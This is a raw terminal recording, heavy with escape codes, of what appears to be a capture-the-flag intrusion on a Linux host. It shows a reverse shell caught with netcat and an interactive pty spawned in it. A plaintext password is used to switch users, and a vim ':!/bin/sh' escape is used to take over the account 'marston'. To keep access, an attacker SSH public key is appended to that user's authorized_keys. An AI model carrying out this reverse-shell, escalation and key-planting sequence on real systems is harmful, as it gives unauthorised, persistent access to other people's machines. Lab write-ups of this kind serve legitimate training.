@@ -1,0 +1,146 @@
+Script started on 2026-10-04 17:38:21+03:00 [COMMAND="rlwrap nc -nlvp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="119" LINES="29"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.24.65.71] from (UNKNOWN) [172.24.64.1] 49316
+SOCKET: Shell has connected! PID: 4395
+[K[K[?2004hpython -c 'import pty'pty[K[K[K[K;pty.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython -c 'import pty;pty.spawn("/bin/bash")'
+[Kwww-data@ip-10-80-141-176:/var/www/html/dev$ [Kwww-data@ip-10-80-141-176:/var/www/html/dev$ [K[?2004hwww-data@ip-10-80-141-176:/var/www/html/dev$ su ArthurMorgan[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsu ArthurMorgan
+[Ksu ArthurMorgan
+[KPassword: [KPassword: [K[?2004hPassword: DeadEye[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hDeadEye
+[K
+[K$ [K$ [K[?2004h$ [7mnc -lvnp 4545[27m[C[C[?2004l[C[C[K[?2004hnc -lvnp 4545
+[Knc -lvnp 4545
+[KListening on 0.0.0.0 4545
+[KConnection received on 127.0.0.1 40228
+
+
+ideaBox
+1.Write
+2.Delete
+3.Steal others' Trash
+4.Show'nExit
+[K[K[?2004h4[?2004l[K[?2004h4
+[K4
+[K[m[m[0m[H[2J[24;1H[1m[37m[41mE325: ATTENTION[0m
+Found a swap file by the name "/tmp/.data.txt.swp"
+[10Cowned by: marston   dated: Sun Oct 04 14:38:07 2026
+[9Cfile name: /tmp/data.txt
+[10Cmodified: YES
+[9Cuser name: marston   host name: ip-10-80-141-176
+[8Cprocess ID: 4369
+While opening file "/tmp/data.txt"
+[13Cdated: Sun Oct 04 14:24:01 2026
+
+(1) Another program may be editing the same file.  If this is the case,
+    be careful not to end up with two different instances of the same
+    file when making changes.  Quit, or continue with caution.
+(2) An edit session for this file crashed.
+    If this is the case, use ":recover" or "vim -r /tmp/data.txt"
+    to recover the changes (see ":help recovery").
+    If you did this already, delete the swap file "/tmp/.data.txt.swp"
+    to avoid this message.
+
+[32mSwap file "/tmp/.data.txt.swp" already exists![0m
+[32m[O]pen Read-Only, (E)dit anyway, (R)ecover, (D)elete it, (Q)uit, (A)bort: [K[32m[O]pen Read-Only, (E)dit anyway, (R)ecover, (D)elete it, (Q)uit, (A)bort: [K[?2004h[32m[O]pen Read-Only, (E)dit anyway, (R)ecover, (D)elete it, (Q)uit, (A)bort: D[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hD
+[KD
+[0m[24;1H[K[24;1H"/tmp/data.txt" 0L, 0C[2;1H[1m[34m~                                                                               [3;1H~                                                                               [4;1H~                                                                               [5;1H~                                                                               [6;1H~                                                                               [7;1H~                                                                               [8;1H~                                                                               [9;1H~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~            [K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[0m[24;1H[K[24;1H"/tmp/data.txt" 0L, 0C[2;1H[1m[34m~                                                                               [3;1H~                                                                               [4;1H~                                                                               [5;1H~                                                                               [6;1H~                                                                               [7;1H~                                                                               [8;1H~                                                                               [9;1H~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~            [K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[0m[24;1H[K[24;1H"/tmp/data.txt" 0L, 0C[2;1H[1m[34m~                                                                               [3;1H~                                                                               [4;1H~                                                                               [5;1H~                                                                               [6;1H~                                                                               [7;1H~                                                                               [8;1H~                                                                               [9;1H~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~                                                                               [14;1H~                                                                               [15;1H~                                                                               [16;1H~                                                                               [17;1H~                                                                               [18;1H~                                                                               [19;1H~                                                                               [20;1H~                                                                               [21;1H~                                                                               [22;1H~                                                                               [23;1H~                                                                               [0m[24;63H0,0-1[9CAll[1;1H[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[0m[24;1H[K[24;1H"/tmp/data.txt" 0L, 0C[2;1H[1m[34m~                                                                               [3;1H~                                                                               [4;1H~                                                                               [5;1H~                                                                               [6;1H~                                                                               [7;1H~                                                                               [8;1H~                                                                               [9;1H~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~                                                                               [14;1H~                                                                               [15;1H~                                                                               [16;1H~                                                                               [17;1H~                                                                               [18;1H~                                                                               [19;1H~                                                                               [20;1H~                                                                               [21;1H~                                                                               [22;1H~                                                                               [23;1H~                                                                               [0m[24;63H0,0-1[9CAll[1;1H[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[?2004h[0m[24;1H[K[24;1H"/tmp/data.txt" 0L, 0C[2;1H[1m[34m~                                                                               [3;1H~           
+                                                                    [4;1H~                                                 
+                              [5;1H~                                                                               [6;1H~      
+                                                                         [7;1H~                                            
+                                   [8;1H~                                                                               [9;1H~ 
+                                                                              [10;1H~                                       
+                                        [11;1H~                                                                             
+  [12;1H~                                                                               [13;1H~                                  
+                                             [14;1H~                                                                        
+       [15;1H~                                                                               [16;1H~                             
+                                                  [17;1H~                                                                   
+            [18;1H~                                                                               [19;1H~                        
+                                                       [20;1H~                                                              
+                 [21;1H~                                                                               [22;1H~                   
+                                                            [23;1H~                                                         
+                      [0m[24;63H0,0-1[9CAll[1;1H[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C::[K[K[7m:!/bin/sh[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h:!/bin/sh
+[K[K[?2004hid[?2004l[K[?2004hid
+[K:!/bin/sh
+[24;1H[K[24;1H:!/bin/sh[9C[24;1H
+[Kid
+uid=1002(marston) gid=1003(marston) groups=1003(marston)
+[K[K[?2004hpython -c 'importy pty;pty,spawn[K[K[K[K[K[K.ap[K[Kspawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython -c 'importy pty;pty.spawn("/bin/bash")'
+[Kpython -c 'importy pty;pty.spawn("/bin/bash")'
+[K[K[?2004hls[?2004l[K[?2004hls
+[Kls
+app
+hicckup.py
+ideas
+run.sh
+[K[K[?2004hwhich python[?2004l[K[?2004hwhich python
+[Kwhich python
+[K/usr/bin/python
+[K[K[?2004h[7mpython -c 'import pty;pty.spawn("/bin/bash")'[27m[?2004l[K[?2004hpython -c 'import pty;pty.spawn("/bin/bash")'
+[Kpython -c 'import pty;pty.spawn("/bin/bash")'
+[Kmarston@ip-10-80-141-176:~$ [Kmarston@ip-10-80-141-176:~$ [K[?2004hmarston@ip-10-80-141-176:~$ cd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd
+[Kcd
+cd
+[Kmarston@ip-10-80-141-176:~$ [Kmarston@ip-10-80-141-176:~$ [K[?2004hmarston@ip-10-80-141-176:~$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+ls
+[Kapp  hicckup.py  ideas  run.sh
+marston@ip-10-80-141-176:~$ [Kmarston@ip-10-80-141-176:~$ [K[?2004hmarston@ip-10-80-141-176:~$ [7mtmux attach-session -t 0[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004htmux attach-session -t 0
+[Ktmux attach-session -t 0
+[Ktmux attach-session -t 0
+open terminal failed: missing or unsuitable terminal: unknown
+marston@ip-10-80-141-176:~$ [Kmarston@ip-10-80-141-176:~$ [K[?2004hmarston@ip-10-80-141-176:~$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+[Kls -al
+total 56
+drwxr-xr-x 8 marston marston 4096 Oct  4 14:38 .
+drwxr-xr-x 6 root    root    4096 Oct  4 14:23 ..
+drwxr-xr-x 5 marston marston 4096 Mar 22  2021 app
+lrwxrwxrwx 1 root    root       9 Mar 23  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 marston marston 3771 Apr  4  2018 .bashrc
+drwx------ 2 marston marston 4096 Mar 22  2021 .cache
+drwxr-x--- 3 marston marston 4096 Mar 21  2021 .config
+drwx------ 3 marston marston 4096 Mar 22  2021 .gnupg
+-rw------- 1 marston root    2559 May 29  2021 hicckup.py
+-rw-r--r-- 1 root    root       6 Mar 23  2021 ideas
+drwxrwxr-x 3 marston marston 4096 Mar 11  2021 .local
+-rw-r--r-- 1 marston marston  807 Apr  4  2018 .profile
+-rwxr-x--- 1 marston root     194 Mar 11  2021 run.sh
+drwx------ 2 marston marston 4096 Mar 23  2021 .ssh
+-rw------- 1 marston marston  836 Oct  4 14:38 .viminfo
+marston@ip-10-80-141-176:~$ [Kmarston@ip-10-80-141-176:~$ [K[?2004hmarston@ip-10-80-141-176:~$ cd .ssh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd .ssh
+[Kcd .ssh
+[Kcd .ssh
+marston@ip-10-80-141-176:~/.ssh$ [Kmarston@ip-10-80-141-176:~/.ssh$ [K[?2004hmarston@ip-10-80-141-176:~/.ssh$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+ls[Kls[Kls
+known_hosts
+marston@ip-10-80-141-176:~/.ssh$ [Kmarston@ip-10-80-141-176:~/.ssh$ [K[?2004hmarston@ip-10-80-141-176:~/.ssh$ echo ":[K[7mssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBq1ScCX+KzKDyeRh/yIU5jQzvA2z9TqwQ1wSAErJZx9[27m[7m [27m[7mhatixntsoa@winux[27m[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBq1ScCX+KzKDyeRh/yIU5jQzvA2z9TqwQ1wSAErJZx9 hatixntsoa@winux" >> authorized_keys[A[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hecho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBq1ScCX+KzKDyeRh/yIU5jQzvA2z9TqwQ1wSAErJZx9 hatixntsoa@winux" >> authorized_keys
+[Kecho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBq1ScCX+KzKDyeRh/yIU5jQzvA2z9TqwQ1wSAErJZx9 hatixntsoa@winux" >> authorized_keys
+[K<TqwQ1wSAErJZx9 hatixntsoa@winux" >> authorized_keys
+marston@ip-10-80-141-176:~/.ssh$ [Kmarston@ip-10-80-141-176:~/.ssh$ [K[?2004hmarston@ip-10-80-141-176:~/.ssh$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[Kexit
+exit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[Kexit
+[K[24;1H
+[32mPress ENTER or type command to continue[K[32mPress ENTER or type command to continue[K[?2004h[32mPress ENTER or type command to continueex[K[K[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[m[m[0m[H[2J[2;1H[1m[34m~                                                                               [3;1H~                                                                               [4;1H~                                                                               [5;1H~                                                                               [6;1H~                                                                               [7;1H~                                                                               [8;1H~                                                                               [9;1H~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~                                       [K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[m[m[0m[H[2J[2;1H[1m[34m~                                                                               [3;1H~                                                                               [4;1H~                                                                               [5;1H~                                                                               [6;1H~                                                                               [7;1H~                                                                               [8;1H~                                                                               [9;1H~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~                                       [K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[m[m[0m[H[2J[2;1H[1m[34m~                                                                               [3;1H~                                                                               [4;1H~                                                                               [5;1H~                                                                               [6;1H~                                                                               [7;1H~                                                                               [8;1H~                                                                               [9;1H~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~                                                                               [14;1H~                                                                               [15;1H~                                                                               [16;1H~                                                                               [17;1H~                                                                               [18;1H~                                                                               [19;1H~                                                                               [20;1H~                                                                               [21;1H~                                                                               [22;1H~                                                                               [23;1H~                                                                               [0m[24;63H0,0-1[9CAll[1;1H[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[m[m[0m[H[2J[2;1H[1m[34m~                                                                               [3;1H~                                                                               [4;1H~                                                                               [5;1H~                                                                               [6;1H~                                                                               [7;1H~                                                                               [8;1H~                                                                               [9;1H~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~                                                                               [14;1H~                                                                               [15;1H~                                                                               [16;1H~                                                                               [17;1H~                                                                               [18;1H~                                                                               [19;1H~                                                                               [20;1H~                                                                               [21;1H~                                                                               [22;1H~                                                                               [23;1H~                                                                               [0m[24;63H0,0-1[9CAll[1;1H[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[A[K[?2004h[m[m[0m[H[2J[2;1H[1m[34m~                                                                               [3;1H~                                  
+                                             [4;1H~                                                                        
+       [5;1H~                                                                               [6;1H~                             
+                                                  [7;1H~                                                                   
+            [8;1H~                                                                               [9;1H~                        
+                                                       [10;1H~                                                              
+                 [11;1H~                                                                               [12;1H~                   
+                                                            [13;1H~                                                         
+                      [14;1H~                                                                               [15;1H~              
+                                                                 [16;1H~                                                    
+                           [17;1H~                                                                               [18;1H~         
+                                                                      [19;1H~                                               
+                                [20;1H~                                                                               [21;1H~    
+                                                                           [22;1H~                                          
+                                     [23;1H~                                                                               [0m[24;63H
+0,0-1[9CAll[1;1H[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[CZZzz[K[?2004l
+[K[?2004hZZzz[?2004l
+Script done on 2026-10-04 17:48:20+03:00 [COMMAND_EXIT_CODE="1"]
